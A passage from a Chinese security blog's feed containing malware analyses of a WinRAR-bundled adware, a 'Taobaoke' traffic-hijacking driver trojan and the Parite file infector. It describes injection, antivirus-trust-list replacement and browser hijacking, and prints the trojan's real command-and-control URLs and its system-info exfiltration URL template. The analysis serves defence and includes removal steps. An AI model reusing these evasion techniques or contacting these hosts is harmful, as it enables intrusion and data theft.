<p>3.解密安装包中zap.dat文件释放子体sclvntfy.dll。<br>先读取zap.dat文件0x1408字节的数据进行解密，从解密数据偏移0x1C处获取文件sclvntfy.dll数据起始位置0x1408，偏移0x20处获取DWORD值0x2C000加0x400即为sclvntfy.dll文件大小0x2C400，每次拷贝0x800字节，拷贝过后进行解密，解密过后释放 system32目录下，<br>key[i] = 1234567890abcdefghijklmnopqrstuvwxyz，解密算法如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-1.jpg" alt=""><br>同样方式从文件ravtmp0.dat中sclvntfy.dat，该文件为驱动文件。</p>
<p>4.添加自启动HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages下添加sclvntfy键值，设置开机自启动。</p>
<p>5.将自身WinRAROp.exe加入系统服务中，开机随系统启动。</p>
<p>6.加载sclvntfy.dll文件，获取函数InitializeChangeNotifyEx并调用。</p>
<p>7.函数InitializeChangeNotifyEx函数功能<br>7.1注入winlogon.exe，提升进程权限，遍历进程查找winlogon.exe进程，获取进程ID，将sclvntfy.dll文件注入该进程<br>7.2Temp目录下ravzap.dat文件中偏移0x0，0x2，0x7写入数据0标志已注入。</p>
<h2 id="子体Sclvntfy-dll功能">子体Sclvntfy.dll功能</h2><h3 id="删除病毒母体文件">删除病毒母体文件</h3><pre><code>SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span><span class="command">\Security</span>
SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span><span class="command">\Enum</span>
SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Services</span><span class="command">\WinRAROp</span>
C:<span class="command">\Program</span> Files<span class="command">\winrar</span><span class="command">\WinRAROp</span>.exe
</code></pre><h3 id="自检测，注入进程">自检测，注入进程</h3><p>1.Sclvntfy.dll加载过后，先检测自身是否被explorer.exe，lsass.exe，winlogon.exe加载，不是则直接退出。</p>
<p>2.遍历进程，查找explorer.exe，lsass.exe，winlogon.exe，如果存在，则注入。</p>
<p>3.在注册表项SOFTWARE\Tencent\TXBSO\下生成键名Value1 = 0，注入成功后，Value1 = 1</p>
<h3 id="自启动">自启动</h3><p>注册自身系统驱动服务sclvntfy.sys，随机加载启动，用于写入360保护文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-2.jpg" alt=""></p>
<h3 id="自更新">自更新</h3><p>病毒会从远程服务器更新ravwap.dat文件，链接</p>
<pre><code><span class="string">http:</span><span class="comment">//www.ronsung.com/ravwap.chm</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-3.jpg" alt=""></p>
<h3 id="绕过杀软，添加自身到信任列表">绕过杀软，添加自身到信任列表</h3><p>1.绕过QQ管家主动防御：<br>检测注册表项SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\QQPCMgr中键值DisplayName是否存在，如存在则将C:\RavRecycle\temp\7F7F7F….5C\ravtmp4.dat文件覆盖拷贝到”C:\Documents and Settings\All Users\Application Data\Tencent\QQPCMgr\qmvext.db”，该文件为QQ管家拦截规则数据库文件，将其替换添加自身到信任列表，即可绕过QQ管家。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-4.jpg" alt=""></p>
<p>2.同样的方法，绕过金山卫士。<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp3.dat<br>替换<br>C:\Program Files\KSafe\kusrtrst.dat</p>
<p>3.绕过Kingsoft Internet Security<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp2.dat<br>替换<br>C:\Program Files\kingsoft\kingsoft antivirus\security\kxescan\kusrtrst.dat</p>
<p>4.绕过360安全卫士<br>360有文件保护功能，通过驱动模块sclvntfy.sys将数据写入。<br>C:\RavRecycle\temp\7F7F7F….5C\ravtmp1.dat<br>替换<br>C|D|E:\Program Files\360\360Safe\ipc\kpuaf.dat<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-5.jpg" alt=""></p>
<h3 id="删除其他网址保护程序">删除其他网址保护程序</h3><p>先重命名，然后删除<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-6.jpg" alt=""></p>
<h3 id="删除其他快捷图标">删除其他快捷图标</h3><p>删除桌面 毒霸网址大全以及其他快捷图标<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-7.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-8.jpg" alt=""></p>
<h3 id="篡改IE主页">篡改IE主页</h3><p>1.判断浏览器是否为IE，如果不是则判断是否为其他浏览器，如果是IE判断首页如果为hao.360.cn或者无首页，在注册表下HKEY_LOCAL_MACHINE\SOFTWARE\Tencent\TXBSO生成键名Value3，键值随机数。</p>
<p>2.解密出推广链接将其设为IE主页，将快播配置文件QvodCfg.in中Other下Home键值置0即删除快播主页。</p>
<pre><code><span class="string">http:</span><span class="comment">//123.sogou.com/?21607</span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-9.jpg" alt=""></p>
<h3 id="浏览器劫持">浏览器劫持</h3><p>HOOK系统函数，劫持浏览器，结束360进程，解除浏览器保护文件。<br>1.HOOK系统函数，CreateProcessW，LoadLibraryExW，ShellExecuteExW，CreateProcessW，ShellExecuteExW函数在创建浏览器进程之后，会劫持该浏览器进程创建过程，在后边加入推广链接<a href="http://123.sogou.com/?21607" target="_blank" rel="external">http://123.sogou.com/?21607</a></p>
<p>2.浏览器列表如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-10.jpg" alt=""></p>
<p>3.劫持进程如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-11.jpg" alt=""><br>同时还会检测进程创建是否为360safe.exe，360tray.exe，360sd.exe，如果是的话直接退出不创建。</p>
<p>4.过滤其他主页保护进程<br>LoadLibraryExW在加载dll文件之前会先判断dll文件是否为其他的主页保护文件，如果是的话，直接退出不加载。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-12.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>捆绑安装，流氓推广]]>
    
    </summary>
    
      <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
    
      <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-淘宝客]]></title>
    <link href="http://blog.idhyt.xyz/2014/01/11/3-virus-troj-taobao/"/>
    <id>http://blog.idhyt.xyz/2014/01/11/3-virus-troj-taobao/</id>
    <published>2014-01-11T03:11:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>淘宝客病毒分析，附带驱动过滤<a id="more"></a></p>
<h2 id="调试环境：">调试环境：</h2><p>Windows XP SP3, OD, IDA, 010Editor等</p>
<h2 id="病毒简介">病毒简介</h2><p>该病毒程序运行后会先创建一个正常的游戏进程，之后会在系统目录下生成一个驱动文件并加载，该驱动文件用于劫持用户访问的淘宝，京东，当当等网站，将其重定向事先设计好的网站从而获取利益，该驱动模块可以从指定的URL自动下载过滤规则和更新驱动文件，并搜集用户系统信息发送到服务器。</p>
<h2 id="病毒运行流程">病毒运行流程</h2><p>1.病毒母体运行后会释放一个正常的游戏文件并运行，之后判断系统平台，如果是32位则在内存中释放出两个DLL文件B70000.DLL和BD0000.DLL</p>
<p>2.BD0000.DLL文件导出两个函数Rmp和Autorii，之后在B70000.DLL中被调用</p>
<p>3.主功能函数Autorii生成驱动文件，加载该驱动实现了驱动过滤，修改注册表，收集系统信息，驱动更新等所有功能。</p>
<h2 id="母体运行流程">母体运行流程</h2><h3 id="释放子体">释放子体</h3><p>释放游戏文件game_tdb.dat<br>1函数GetFileAttributesA检测game_tdb.dat文件是否存在，存在则删除<br>2在同目录下创建game_tdb.dat文件<br>3从文件偏移0x4F9D8处大小为0x15DA00字节的资源文件数据到game_tdb.dat文件中</p>
<h3 id="释放DLL文件，运行游戏">释放DLL文件，运行游戏</h3><p>1.检测操作系统版本，如果系统为64位则不进行释放DLL也不会进行感染。</p>
<p>2.当前进程内申请堆空间，从文件偏移0x1AD3D8开始大小为0x51000字节的资源文件按照PE格式映射到该堆块中，名字取B70000.DLL</p>
<p>3.获取释放的B70000.DLL中函数Rmp和Autorii地址</p>
<p>4.调用CreateProcess函数运行游戏进程game_tdb.dat</p>
<h3 id="执行B70000-DLL入口函数进行初始化">执行B70000.DLL入口函数进行初始化</h3><h3 id="执行B70000-dll功能函数1-_Rmp">执行B70000.dll功能函数1. Rmp</h3><p>在DLL偏移0x14820的BSS段数据中写入资源在母体的偏移和大小</p>
<h3 id="开启功能">开启功能</h3><p>1.执行B70000.dll功能函数2.Autorii，关闭驱动保护，加载驱动过滤，下载驱动过滤规则等操作</p>
<h3 id="自退出">自退出</h3><p>释放内存 关闭句柄等操作，之后退出</p>
<h2 id="功能函数2-_Autorii">功能函数2. Autorii</h2><h3 id="初始化">初始化</h3><p>检测系统版本，如果是64位系统则直接退出，释放BD0000.DLL文件并进行初始化</p>
<h3 id="关闭驱动保护">关闭驱动保护</h3><p>1.通过GetFileAttributesA 函数查找C:\WINDOWS\system32\drivers\目录下NetSafe_sys，WebSafe_sys，gamecn_sys，yxhh_sys，tcpbtext_sys，spgame_sys，找到以后调用SetFileSecurityA函数将驱动权限改为全局。经查询这些驱动模块为同类恶意软件释放的驱动模块，避免和同类冲突，造成影响。</p>
<p>2.调用BD0000.DLL中函数StopDriverProtect，通过DeviceIoControl给驱动发送0x80002810操作，驱动接受到命令后会调用KeDelayExecutionThread函数将其驱动进程休眠，即实现了关闭了驱动保护功能。之后会将几个驱动模块删除掉。</p>
<p>注：由于此时驱动未加载，所以打开驱动.\NetSafe0失败将导致直接退出该功能函数，但是在后边驱动加载过后会再次执行该过程。</p>
<h3 id="释放驱动文件Mfc42w-dll">释放驱动文件Mfc42w.dll</h3><p>1.在临时目录C:\Documents and Settings\Admin\Local Settings\Temp下生成<br>Mfc42w.dll文件，写入0x1D708字节数据</p>
<p>2.获取当前本机系统时间，检测时间是否符合规则：年份小于9999，月份小于12，日期小于31，时小于24，分秒小于60，毫秒小于1000等。</p>
<p>3.读取文件创建时间2011.12.19，11:40:16，将文件时间设置为该时间，之后进行更新时会检测该时间与ver标志后边的时间进行对比，如果新版本的时间大于该时间，则进行更新。</p>
<h3 id="数据加密">数据加密</h3><p>调用BD0000.dll中函数SetUpdateUrl将病毒升级的Url加密并写入注册表<br>1.打开注册表HKLM\SYSTEM\CurrentControlSet\Control\Network生成四个子键，键名分别为AuthenticationC，SecurityC，AuthenticationD，SecurityD</p>
<p>2.写入四个子键的键值，由四个Url链接分别加密生成    </p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.xml
<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.dat
<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.ini
<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.conf
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-1.jpg" alt="">  </p>
<h3 id="加载驱动服务">加载驱动服务</h3><p>调用BD0000.dll函数InstallDriver加载驱动服务<br>1.打开注册表HKLM\SYSTEM\CurrentControlSet\Control\NetSafe</p>
<p>2.遍历该注册表子键，清除注册表中netsafe.sys的相关键值，并尝试将C:\WINDOWS\system32\目录下的NetSafe.sys移除</p>
<p>3.将临时文件目录下的Mfc42w.dll拷贝到C:\WINDOWS\system32\mfc42w.dll</p>
<p>4.打开注册表HKLM\SYSTEM\CurrentControlSet\Services生成一个mfc42w的子项，并生成四个子键，注册为驱动服务，如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-2.jpg" alt="">  </p>
<p>5获取ZwLoadDriver函数地址，提升权限，然后调用该函数ZwLoadDriver加载驱动服务mfc42w.dll</p>
<h3 id="关闭驱动保护-1">关闭驱动保护</h3><p>1.在C:\DOCUME~1\Admin\LOCALS~1\Temp\目录下生成大小为0x6b14的文件safeini.cfg并设置文件属性为隐藏</p>
<p>2.调用0xBD000.DLL函数LoadConfig创建驱动过滤规则文件并关闭驱动保护<br>2.1打开驱动服务\.\NetSafe0，调用 DeviceIoControl向驱动发送消息，IoControlCode = 8000280C，从驱动中读取字符串mfc42w，之后将以该字符串为名在目录C:\WINDOWS\system32\下创建一个驱动过滤规则文件mfc42w.dat<br>2.2从C:\DOCUME~1\Admin\LOCALS~1\Temp\safeini.cfg 文件中读取0x14字节数据对标志位进行检测。<br>2.3打开驱动服务\.\NetSafe0，调用 DeviceIoControl向驱动发送消息，IoControlCode =80002810，关闭驱动保护。<br>2.4将C:\DOCUME~1\Admin\LOCALS~1\Temp\safeini.cfg文件复制到<br>C:\WINDOWS\system32\目录下，并重命名为mfc42w.dat。</p>
<h3 id="解密驱动过滤规则">解密驱动过滤规则</h3><p>解密驱动过滤规则到内核内存池中<br>1.打开驱动服务\.\NetSafe0，提升权限，调用 DeviceIoControl向驱动发送消息，IoControlCode = 80002808</p>
<p>2.该驱动派遣函数使用了代码混淆技术，最后会调用ZwCreateFile函数打开生成的mfc42w.dat文件</p>
<p>3.调用ZwWriteFile从该文件中读取前0x14字节数据，检验头四个字节是否为0x6E736374h即文件标志tcsn，如果不是则表明文件被修改或者不是自身文件，则直接退出<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-3.jpg" alt="">   </p>
<p>4.调用ZwWriteFile函数将前0x14字节之后的0x6B00字节数据读到申请的堆块中</p>
<p>5.调用函数ExAllocatePool在内核中分配0x6b01字节大小的堆块初始化0，将0x6B00字节数据内容解密存放在该堆块中，解密的数据为驱动过滤规则<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-4.jpg" alt=""><br>Dump出来如下所示（部分）<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-5.jpg" alt=""> </p>
<p>6.遍历解密出的数据得到版本号等信息存放到一个结构体中<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-6.jpg" alt="">   </p>
<h3 id="访问远程服务器">访问远程服务器</h3><p>获取系统信息按照指定的格式访问链接<br>1.调用函数GetAdapterslnfo获取当前MAC地址，并判断是否为0.0.0.0</p>
<p>2.调用函数GetVolumeInformationA和GetDiskFreeSpaceExA 获取系统C盘的剩余磁盘信息<br>3.按照格式</p>
<pre><code>http:<span class="regexp">//xml</span>.btplay.net:<span class="number">83</span>/union/<span class="keyword">index</span>.php/setup/add?mac=<span class="variable">%s</span>&amp;disk=<span class="variable">%s</span>&amp;cCapity=<span class="variable">%s</span>&amp;userId=<span class="variable">%d</span>&amp;cpu=<span class="variable">%s</span>&amp;<span class="keyword">rand</span>=<span class="variable">%d</span>
</code></pre><p>生成URL链接：</p>
<pre><code><span class="keyword">http</span>://xml.btplay.net:<span class="number">83</span>/<span class="built_in">union</span>/index.php/setup/<span class="built_in">add</span>?mac=<span class="number">00</span>-<span class="number">0</span>C-<span class="number">29</span>-<span class="number">02</span>-<span class="number">4</span>A-<span class="number">13</span>&amp;disk=C075-<span class="number">4</span>B05&amp;cCapity=<span class="number">35360</span>&amp;userId=<span class="number">27</span>&amp;cpu=<span class="number">50482254</span>&amp;rand=<span class="number">31</span>
</code></pre><p>访问该链接下载数据</p>
<h3 id="删除系统驱动文件">删除系统驱动文件</h3><p>删除C:\WINDOWS\system32\dvrvers\目录下NetSafe_sys，WebSafe_sys，gamecn_sys，yxhh_sys，tcpbtext_sys，spgame_sys</p>
<h2 id="驱动模块mfc42w-dll功能">驱动模块mfc42w.dll功能</h2><h3 id="驱动初始化">驱动初始化</h3><p>1.调用IoCreateDevice函数用于创建驱动对象\.\NetSafe0并将驱动服务写入注册表Registry\System\ControlSet001\Services\mfc42w</p>
<p>2.调用函数IoCreateSymbolicLink创建符号链接</p>
<p>3.生成驱动派遣函数，总共有三个派遣函数，对应的DeviceIoControl和功能分别为：</p>
<pre><code><span class="number">80002808</span>h：用于解密驱动过滤规则
<span class="number">8000280</span>Ch：获取驱动规则文件名
<span class="number">80002810</span>h：关闭驱动保护
</code></pre><h3 id="驱动更新">驱动更新</h3><p>创建线程：mfc42w+0x92a0用于更新驱动过滤规则和驱动文件<br>该线程创建了三个事件sub_190D0，sub_18F00，sub_1D9D0，三个线程的激活时间为系统运行超过6小时，12小时，2小时<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-7.jpg" alt="">   </p>
<p>1.事件sub_190D0系统运行超过6小时激活该事件，更新驱动过滤规则<br>1.1读取REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control\Network子键AuthenticationC和SecurityC的键值，解密出Url地址</p>
<pre><code><span class="constant">AuthenticationC-</span>---&gt;<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.xml
<span class="constant">SecurityC-</span>---&gt;<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.dat
</code></pre><p>1.2发送IoControlRequest请求从该服务器链接下载更新信息27.xml文件和驱动过滤滤规则文件27.dat<br>1.3读取配置更新文件27.xml标志ver后边的版本时间进行校验，如果大于之前的文件时间，则进行更新。然后将27.dat文件重命名为mfc42w.dat文件<br>1.4如果需要更新，则将mfc42w.dat文件进行解密，生成新的驱动过滤规则存放在内核内存池中。该过程同IoControlCode = 80002808方式相同。</p>
<p>2.事件sub_18F00 系统运行超过12小时激活该事件，更新驱动文件<br>2.1读取REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control\Network子键AuthenticationD和SecurityD的键值，解密出Url地址</p>
<pre><code><span class="constant">AuthenticationD-</span>---&gt;<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.ini
<span class="constant">SecurityD-</span>---&gt;<span class="symbol">http:</span>/<span class="regexp">/xml.btplay.net:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.conf
</code></pre><p>2.2发送IoControlRequest请求从该服务器链接出下载配置文件27.ini和驱动文件27.conf<br>2.3读取配置文件27.ini标志ver后边的数据进行校验，然后将27.conf文件重命名为.tmp文件并存放到\SystemRoot\system32\目录下，如果经过校验需要更新的话，该文件用于更新mfc42w驱动模块。</p>
<p>3.事件sub_1D9D0系统运行超过2小时激活该事件，搜集本机信息发送到指定的服务器<br>3.1遍历注册表REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces，枚举子项中子键键名为EnableDHCP的键值，如果为0查找是否存在NameServer子键，如果为1查找是否存在DhcpNameServer子键，之后获取相应的键值即得到本机IP地址<br>3.2通过解密的URL获取服务器端口号83和后缀XML<br>3.3搜集本机系统信息转换为xml按照格式</p>
<pre><code><span class="constant">GET</span> <span class="variable">%s</span> <span class="constant">HTTP</span>/<span class="number">1.1</span>..<span class="constant">Accept</span><span class="symbol">:*/*</span>..<span class="constant">Accept</span>-<span class="constant">Language</span><span class="symbol">:zh-cn</span>..<span class="constant">Accept</span>-<span class="constant">Encoding</span><span class="symbol">:deflate</span>..<span class="constant">User</span>-<span class="constant">Agent</span><span class="symbol">:Mozilla/</span><span class="number">4.0</span>(compatible;<span class="constant">MSIE6</span>.<span class="number">0</span>;<span class="constant">WindowsNT5</span>.<span class="number">1</span>;<span class="constant">SV1</span>)..<span class="constant">Host</span><span class="symbol">:%s</span>
</code></pre><p>生成URL：</p>
<pre><code><span class="constant">GET</span> <span class="symbol">http:</span>/<span class="regexp">/ d.nsonly.com:83/union</span><span class="regexp">/uploads/</span><span class="number">27</span>/<span class="number">27</span>.xml <span class="constant">HTTP</span>/<span class="number">1.1</span>..<span class="constant">Accept</span><span class="symbol">:*/*</span>..<span class="constant">Accept</span>-<span class="constant">Language</span><span class="symbol">:zh-cn</span>..<span class="constant">Accept</span>-<span class="constant">Encoding</span><span class="symbol">:deflate</span>..<span class="constant">User</span>-     <span class="constant">Agent</span><span class="symbol">:Mozilla/</span><span class="number">4.0</span>(compatible;<span class="constant">MSIE6</span>.<span class="number">0</span>;<span class="constant">WindowsNT5</span>.<span class="number">1</span>;<span class="constant">SV1</span>)..<span class="constant">Host</span><span class="symbol">:</span><span class="number">83</span>
</code></pre><p>向指定的服务器</p>
<pre><code>d<span class="class">.nsonly</span><span class="class">.com</span>:<span class="number">83</span>发送数据，接受远程命令
</code></pre><p>3.4接受的命令如果是Ctrl则在注册表REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control写入logEvent，如果是UpDriver则升级驱动，如果是UpConfig则升级驱动过滤规则文件</p>
<h3 id="记录系统启动次数和驱动安装信息">记录系统启动次数和驱动安装信息</h3><p>在注册表REGISTRY\MACHINE\SYSTEM\CurrentControlSet\Control创建子键Base和Bounds，其中Base记录开机次数，bound写入驱动文件安装时间<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-8.jpg" alt=""></p>
<h3 id="创建tcp过滤设备">创建tcp过滤设备</h3><p>1.打开驱动设备\Device\Tcp，调用函数IoGetDeviceObjectPointer，IoCreateDevice，IoAttachDeviceToDeviceStack创建过滤TCP驱动，向TCP驱动上层中插入自己的TCP过滤驱动</p>
<p>2.当有http的GET或POST数据时，会触发线程mfc42w+0x92a0的事件，根据驱动过滤规则生成新的数据，之后通过函数IoGetRelatedDeviceObject和IoBuildDeviceIoControlRequest重建一个IRP请求，调用ZwCreateFile函数打开对应的驱动设备\Device\Tcp，然后发送给目标驱动</p>
<h3 id="自保护">自保护</h3><p>创建线程：mfc42w+0x7560保护驱动自身注册表信息。<br>循环检测驱动注册表是否已创建，如果不存在，则创建，创建方式同功能函数  Autorii 相同，在注册表\System\ControlSet001\Services\mfc42w下生成驱动服务所需的四个子项<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-9.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>淘宝客病毒分析，附带驱动过滤]]>
    
    </summary>
    
      <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
    
      <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-parite感染型]]></title>
    <link href="http://blog.idhyt.xyz/2014/01/05/3-virus-infected-parite/"/>
    <id>http://blog.idhyt.xyz/2014/01/05/3-virus-infected-parite/</id>
    <published>2014-01-05T03:11:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>parite感染型病毒行为分析 <a id="more"></a></p>
<h2 id="病毒信息">病毒信息</h2><p>文件类型：dll文件(PE)<br>大小: 176128 字节<br>MD5: 4F407B29D53E9EB54E22D096FCE82AA7<br>加壳方式：UPX 0.80 - 1.24 DLL -&gt; Markus &amp; Laszlo<br>编写语言：Borland C++ DLL Method 2</p>
<h2 id="病毒简介">病毒简介</h2><p>1.感染病毒通过在Explorer注册表下添加键值，导致Explorer进程创建时会装载感染Dll去创建一个新的线程感染系统文件，包括感染硬盘exe和src文件，同时会去感染同域下的其他系统。</p>
<p>2.同时在感染dll中Initiate函数，通过HOOK文件操作函数和注入全局钩子，监控并注入其他进程进行感染操作。</p>
<h2 id="感染过程">感染过程</h2><h3 id="检测感染文件加载模块">检测感染文件加载模块</h3><p>检测加载感染病毒dll文件的进程是否为explorer.exe，如果不是则直接退出。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-1.jpg" alt=""></p>
<h3 id="检测感染环境">检测感染环境</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-2.jpg" alt=""></p>
<p>1检测程序是否处于调试模式，如果是则退出</p>
<p>2创建互斥体Residented，保证系统中只运行一个感染进程。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-3.jpg" alt=""></p>
<p>3加载病毒感染模块</p>
<p>4删除临时目录下的临时文件</p>
<p>5将感染dll文件添加新键值PINF写入注册表中随Explorer启动加载Software\Microsoft\Windows\CurrentVersion\Explorer<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-4.jpg" alt=""></p>
<p>6.注册全局消息钩子，系统关机注销前将自身正常退出<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-5.jpg" alt=""></p>
<h3 id="创建感染线程">创建感染线程</h3><p>1.创建感染过滤文件列表：<br>readbook.exe，rundll32.exe，\dllcache\目录下.exe和.src文件不进行感染<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-6.jpg" alt=""></p>
<p>2.创建感染文件结构体InfectFileStruct，并初始化<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-7.jpg" alt=""></p>
<p>3.获取系统磁盘列表，如果是硬盘或可移动磁盘，进行感染<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-8.jpg" alt=""></p>
<p>4.检测是否为PE文件</p>
<p>5.检测该文件是否被感染，感染标志为节区名，节名规则</p>
<pre><code>.[<span class="link_label">x-6</span>][<span class="link_reference">x-3</span>][<span class="link_label">x</span>][<span class="link_reference">xxoo</span>]
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-9.jpg" alt=""></p>
<p>6.如果没有被感染过，则进行感染，获取文件信息，写入感染文件结构体InfectFileStruct中<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-10.jpg" alt=""></p>
<p>7.修改PE头信息(节区数)，添加感染节区，写入加密代码DecodeProc(用于解码感染dll文件并加载执行感染过程)，修改程序入口代码优先执行DecodeProc代码，将感染dll加入导入表。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-11.jpg" alt=""></p>
<p>8.对局域网进行感染<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-12.jpg" alt=""></p>
<h3 id="初始化函数_Initiate">初始化函数 Initiate</h3><p>1.HOOK文件操作函数对文件进行感染<br>2.注册全局钩子，将DLL注入有CALLWNDPROC的进程进行感染<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-infected-parite-13.jpg" alt=""></p>
<h2 id="查杀修复方式">查杀修复方式</h2><p>1.检测系统是否存在互斥体Residented</p>
<p>2.删掉注册表Software\Microsoft\Windows\CurrentVersion\Explorer键值PINF</p>
<p>3.重启exploere.exe进程（结束，启动）</p>
<p>4.感染节区清零，删除感染节区数据，节区数减1</p>
<p>5.修复程序OEP代码，修复导入表(去除插入的感染dll)</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>parite感染型病毒行为分析]]>
    
    </summary>
    
      <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
    
      <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
